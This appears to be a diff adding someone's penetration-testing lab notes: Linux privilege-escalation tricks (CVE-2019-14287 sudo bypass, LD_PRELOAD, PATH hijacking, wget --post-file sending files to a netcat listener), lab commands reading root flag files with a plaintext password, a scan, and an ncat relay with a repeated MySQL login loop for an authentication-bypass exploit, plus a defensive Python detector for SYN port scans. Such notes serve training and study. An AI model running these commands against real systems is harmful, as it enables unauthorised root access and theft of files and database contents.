@@ -1,0 +1,205 @@
+* Weak file permission
+ssh -i id_rsa -p 2222 ubuntu@10.0.1.3
+resources: https://infosecwriteups.com/linux-privesc-tryhackme-writeup-bf4e32460ee5
+
+* CVE-2019-14287
+sudo -u#-1 /bin/bash
+resources: https://www.exploit-db.com/exploits/47502
+
+* CVE-2019-18634
+resources: https://www.exploit-db.com/exploits/47995
+
+* LD_PRELOAD
+sudo LD_PRELOAD=/tmp/shell.so ls
+resources: https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/
+
+* Exploiting Apt-Get
+resources: https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/
+
+* exploiting environment variables
+echo "/bin/bash" > ps ----> use the function which is in command(strings file) here file is the one which has all suid permissions
+resources: https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/
+
+* capabilities
+resource: https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/
+
+* WordPress exploitation
+resources: https://www.exploit-db.com/docs/english/45556-wordpress-penetration-testing-using-wpscan-and-metasploit.pdf
+    	     https://www.hackingarticles.in/wpscanwordpress-pentesting-framework/
+
+* cron path
+resource: https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/
+
+* cron wildcards, cron file overwrites
+ resource: https://infosecwriteups.com/linux-privesc-tryhackme-writeup-bf4e32460ee5
+
+* wget exploitation
+  resource: 
+  commands: Linux Privilege Escalation - Intended Functionality (wget)
+
+		nc -lvp 8085
+
+		sudo /usr/bin/wget --post-file="FILE NAME" IP: PORT
+
+* stored credentials commands
+history
+su user_1001
+davehacker
+sudo -s
+cat /root/proof.txt
+namp -T5 -sS -sV --open 10.1.4.2/24
+ssh -i bank-server.id_rsa root@10.1.4.133 -p 2222
+cat /root/flag.txt
+
+detecting suspicious scanners
+./detector.py pcap-file
+detector.py
+#!/usr/bin/env python3
+
+"""
+Given a .pcap file, this program will attempt to identify IP addresses that may
+be executing TCP SYN port scans.
+The output should be the set of IP addresses that sent at least 3 times more
+SYN packets than the number of SYN-ACK packets they received.
+"""
+
+import dpkt, socket, sys
+
+#=CONSTANTS===================================================================#
+
+SYN_SYNACK_RATIO = 3
+
+#=FUNCTIONS===================================================================#
+
+def tcpFlags(tcp):
+    """Returns a list of the set flags in this TCP packet."""
+    ret = list()
+
+    if tcp.flags & dpkt.tcp.TH_FIN != 0:
+        ret.append('FIN')
+    if tcp.flags & dpkt.tcp.TH_SYN  != 0:
+        ret.append('SYN')
+    if tcp.flags & dpkt.tcp.TH_RST  != 0:
+        ret.append('RST')
+    if tcp.flags & dpkt.tcp.TH_PUSH != 0:
+        ret.append('PSH')
+    if tcp.flags & dpkt.tcp.TH_ACK  != 0:
+        ret.append('ACK')
+    if tcp.flags & dpkt.tcp.TH_URG  != 0:
+        ret.append('URG')
+    if tcp.flags & dpkt.tcp.TH_ECE  != 0:
+        ret.append('ECE')
+    if tcp.flags & dpkt.tcp.TH_CWR  != 0:
+        ret.append('CWR')
+    
+    return ret
+
+
+def compare_IPs(ip1, ip2):
+    """
+    Return negative if ip1 < ip2, 0 if they are equal, positive if ip1 > ip2.
+    """
+    return sum(map(int, ip1.split('.'))) - sum(map(int, ip2.split('.')))
+
+#=ARG PARSING=================================================================#
+
+# Must include a pcap to read from.
+if len(sys.argv) <= 1:
+    print("{0}: needs a filepath to a PCAP file".format(sys.argv[0]))
+    sys.exit(-1)
+
+# Try to open the pcap file and create a pcap.Reader object.
+try:
+    f = open(sys.argv[1],'rb')
+    pcap = dpkt.pcap.Reader(f)
+except (IOError, KeyError):
+    print("Cannot open file:", sys.argv[1])
+    sys.exit(-1)
+
+# Set ratio if provided.
+if len(sys.argv) == 3:
+    try:
+        SYN_SYNACK_RATIO = float(sys.argv[2])
+    except ValueError:
+        print("invalid ratio value:", sys.argv[2])
+        sys.exit(-1)
+
+#=MAIN========================================================================#
+
+suspects = dict() # Dictionary of suspects. suspect's IP: {# SYNs, # SYN-ACKs}
+curPacket = 0     # Current packet number.
+
+# Analyze captured packets.
+for ts, buf in pcap:
+    curPacket += 1
+
+    # Ignore malformed packets
+    try:
+        eth = dpkt.ethernet.Ethernet(buf)
+    except (dpkt.dpkt.UnpackError, IndexError):
+        continue
+
+    # Packet must include IP protocol to get TCP
+    ip = eth.data
+    if not ip:
+        continue
+
+    # Skip packets that are not TCP
+    tcp = ip.data
+    if type(tcp) != dpkt.tcp.TCP:
+        continue
+
+    # Get all of the set flags in this TCP packet
+    tcpFlag = tcpFlags(tcp)
+
+    srcIP = socket.inet_ntoa(ip.src)
+    dstIP = socket.inet_ntoa(ip.dst)
+
+    # Fingerprint possible suspects.
+    if {'SYN'} == set(tcpFlag):          # A 'SYN' request.
+        if srcIP not in suspects: suspects[srcIP] = {'SYN': 0, 'SYN-ACK': 0}
+        suspects[srcIP]['SYN'] += 1
+    elif {'SYN', 'ACK'} == set(tcpFlag): # A 'SYN-ACK' reply.
+        if dstIP not in suspects: suspects[dstIP] = {'SYN': 0, 'SYN-ACK': 0}
+        suspects[dstIP]['SYN-ACK'] += 1
+
+# Prune unlikely suspects based on ratio of SYNs to SYN-ACKs.
+for s in list(suspects):
+    if suspects[s]['SYN'] < (suspects[s]['SYN-ACK'] * SYN_SYNACK_RATIO):
+        del suspects[s]
+
+# Output results.
+print("Analyzed", curPacket, "packets:")
+
+if not suspects:
+    print('no suspicious packets detected...')
+from functools import cmp_to_key
+for s in sorted(suspects.keys(), key=cmp_to_key(compare_IPs)):
+    syns = suspects[s]['SYN']
+    synacks = suspects[s]['SYN-ACK']
+
+    print("{0:15} had {1} SYNs and {2} SYN-ACKs".format(s, syns, synacks))
+
+
+* private hosted server
+ssh ubuntu@10.1.3.3 -p WAYNE01
+
+WAYNE01
+
+ncat --sh-exec "ncat 10.6.1.47 3306" -l 43210 --keep-open
+
+for i in seq 1 1000; do mysql -P 43210 --password=bad --host 10.1.3.3 2>/dev/null; done
+
+show databases;
+
+use employees;
+
+show tables;
+
+select * from users;
+
+resource: https://www.exploit-db.com/exploits/19092
+
+
+
+
